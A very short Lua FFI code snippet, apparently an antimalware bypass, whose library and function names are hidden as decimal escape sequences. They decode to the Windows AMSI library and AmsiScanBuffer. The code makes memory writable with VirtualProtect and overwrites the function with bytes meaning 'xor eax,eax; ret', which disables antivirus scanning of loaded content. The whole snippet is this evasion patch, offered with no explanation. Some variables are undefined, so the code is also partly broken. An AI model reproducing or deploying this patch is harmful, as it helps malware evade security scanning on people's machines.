local ffi = require("\102\102\105")
local lib = ffi.load("\097\109\115\105")
local api = "\065\109\115\105\083\099\097\110\066\117\102\102\101\114"
local ptr = ffi.cast("\117\105\110\116\056\095\116\042", export)
win.VirtualProtect(ptr, 32, 64, old)
ptr[0] = 49 ptr[1] = 192 ptr[2] = 195
